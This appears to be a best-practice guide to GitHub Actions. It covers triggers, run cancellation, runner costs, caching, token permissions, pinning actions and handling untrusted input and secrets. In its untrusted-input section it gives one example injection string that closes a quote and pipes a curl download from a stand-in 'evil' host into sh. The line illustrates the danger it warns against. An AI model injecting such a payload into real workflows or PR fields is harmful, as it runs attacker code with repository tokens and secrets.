# GitHub Actions

Workflows live in `.github/workflows/*.yml`, one file per purpose. Every run
costs minutes on a private repository and wall-clock time on any repository, so
the goal is a workflow that runs when its result matters and never otherwise.

## Shape

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npm test
```

Those five blocks — trigger, permissions, concurrency, runner, timeout — decide
almost all of the cost.

---

## Trigger only when the result matters

**Pair `pull_request` with a branch-filtered `push`.** `on: [push, pull_request]`
with no filters runs twice for every commit on a branch with an open PR, and
bills both.

```yaml
on:
  pull_request:
  push:
    branches: [main]
```

**Filter by path when a workflow only covers part of the tree.**

```yaml
on:
  pull_request:
    paths:
      - 'src/**'
      - 'package-lock.json'
      - '.github/workflows/ci.yml'
```

A path-filtered workflow that branch protection lists as required blocks every
PR that does not touch those paths, because the check never reports. Either
leave required checks unfiltered, or add a job with the same name that runs
everywhere and exits 0 when there is nothing to do.

**Skip drafts, and pick up the promotion.** `pull_request` fires on `opened`,
`synchronize`, and `reopened` by default. Add `ready_for_review` so the run
happens when the draft is promoted.

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]

jobs:
  test:
    if: github.event.pull_request.draft == false
```

**Add `workflow_dispatch` to anything worth re-running by hand.** It costs
nothing until used and removes the temptation to push an empty commit.

**Treat `schedule` as a standing bill.** A nightly matrix on a private
repository spends minutes whether or not anything changed. Give scheduled runs
a narrow job and a `timeout-minutes`. In a public repository, GitHub disables
scheduled workflows after 60 days without repository activity.

**Add `merge_group` when the repository uses a merge queue**, or queued PRs
never get their checks.

---

## Cancel superseded runs

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

Three pushes in a minute otherwise pay for three full runs, and the first two
results are stale on arrival. Keep `cancel-in-progress` false for `main`, where
each commit's result is worth having, and for deploys, where a canceled run can
leave a half-finished release.

---

## Cost per minute

Private repositories bill by runner. Public repositories get standard runners
free, and bill larger runners.

| Runner | Multiplier |
|---|---|
| Linux 2-core | 1x |
| Windows | 2x |
| macOS | 10x |

**Default to `ubuntu-latest`.** Use Windows or macOS only for a job that cannot
produce its result anywhere else, such as a signed macOS build.

**Fan out a matrix over what ships, not over what is possible.** Three Node
versions times three operating systems is nine jobs, and eight of them tell you
nothing new. Keep `fail-fast: true` so one failure stops the rest.

```yaml
strategy:
  matrix:
    node: [22]
    os: [ubuntu-latest]
    include:
      - node: 20
        os: ubuntu-latest
```

**Put `timeout-minutes` on every job.** The default is 360, so one hung job
bills six hours. Ten minutes suits most test jobs.

---

## Do less inside the run

**Cache the dependency install.** The `setup-*` actions cache from a lockfile
with one input:

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 22
    cache: npm
```

For anything else, key the cache on the lockfile hash and give it a fallback:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cargo
    key: cargo-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
    restore-keys: cargo-${{ runner.os }}-
```

**Leave `actions/checkout` at its default depth of 1.** Set `fetch-depth: 0`
only for a step that reads history, such as a changelog generator or
`git describe`.

**Order jobs so the cheap one gates the expensive one.** Lint in a one-minute
job, and have the matrix `needs: lint`.

**Shorten artifact retention.** The default is 90 days, and storage bills by
gigabyte-day.

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: coverage
    path: coverage/
    retention-days: 5
```

**Share duplicated jobs with `workflow_call`** rather than copying a job into
four workflow files that then drift.

---

## Permissions

`GITHUB_TOKEN` gets whatever the repository or organization default grants,
which is often write to everything. Set the floor at the top of every workflow,
then raise it per job:

```yaml
permissions:
  contents: read

jobs:
  comment:
    permissions:
      contents: read
      pull-requests: write
```

| Scope | Needed for |
|---|---|
| `contents: read` | checkout |
| `contents: write` | pushing tags, commits, or releases |
| `pull-requests: write` | commenting on or labeling a PR |
| `issues: write` | commenting on or closing an issue |
| `packages: write` | publishing to GitHub Packages |
| `id-token: write` | OIDC to a cloud provider |
| `checks: write` | publishing a check run |

---

## Third-party actions

**Pin anything outside `actions/*` to a full commit SHA**, with the version in a
comment. A tag moves, and a moved tag runs new code with your token.

```yaml
- uses: some-org/some-action@3f2a1b9c0d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a # v2.1.0
```

**Keep those pins current with Dependabot**, which also batches the noise into
one PR a week:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

---

## Untrusted input

**`pull_request` runs fork code with a read-only token and no secrets.** That is
the safe default, and the reason a fork PR cannot post a comment from CI.

**`pull_request_target` runs with the base repository's write token and full
access to secrets.** Checking out the PR head under that trigger and running any
of its code — a build script, a test, a dependency install — hands the token to
whoever opened the PR. When a workflow needs `pull_request_target`, keep it on
event metadata and never check out the head.

```yaml
# Safe: labels a PR by size, reads no PR code.
on:
  pull_request_target:
    types: [opened, synchronize]
permissions:
  pull-requests: write
```

**Never interpolate event text into a `run` block.** A branch name, PR title, or
issue body containing `"; curl evil.sh | sh; #` runs as shell when pasted
through `${{ }}`. Pass it through the environment, where it stays a string:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Approve fork runs deliberately.** A first-time contributor's workflow waits
for a maintainer. Read the diff before approving, including the workflow files.

---

## Secrets

- Reference them as `${{ secrets.NAME }}`. A literal in a workflow file is a
  leak, and the file is as public as the repository.
- Actions masks a secret's value in logs, and masking fails on anything
  transformed — base64, JSON-encoded, or split. Do not print them.
- Gate a deploy behind an environment with required reviewers, and scope the
  secret to that environment.
- Prefer OIDC (`id-token: write`) over a long-lived cloud key.

